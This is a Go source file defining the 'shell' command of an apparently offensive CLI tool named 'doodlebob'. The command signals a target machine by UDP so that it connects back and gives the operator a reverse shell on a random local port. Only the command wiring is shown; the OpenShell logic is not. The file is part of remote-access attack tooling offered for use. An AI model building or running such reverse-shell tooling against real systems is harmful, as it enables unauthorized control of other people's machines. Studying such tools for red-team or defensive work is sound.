package cli

import "github.com/spf13/cobra"

var shellCommand = &cobra.Command{
	Use:   "shell <target-ip>",
	Short: "Opens a reverse shell that the target connects to",
	Long: `Opens a shell on a random port between 10000 and 55000, then has the target attempt to connect to it.
	Defaults to <target-ip>:6767 for the destination of the UDP packet, can be changed with flags.
	Example:
		doodlebob shell 192.168.10.1`,
	Args: cobra.MinimumNArgs(1), // Ensures at least 1 argument
	RunE: func(cmd *cobra.Command, args []string) error {
		targetIP := args[0]

		if !cmd.Flags().Changed("target") {
			udpTarget = targetIP
		}

		// Run the OpenShell function when the command is run
		err := OpenShell(udpTarget, targetIP, port)
		if err != nil {
			return err
		}

		return nil
	},
}

func init() {
	rootCmd.AddCommand(shellCommand)
}
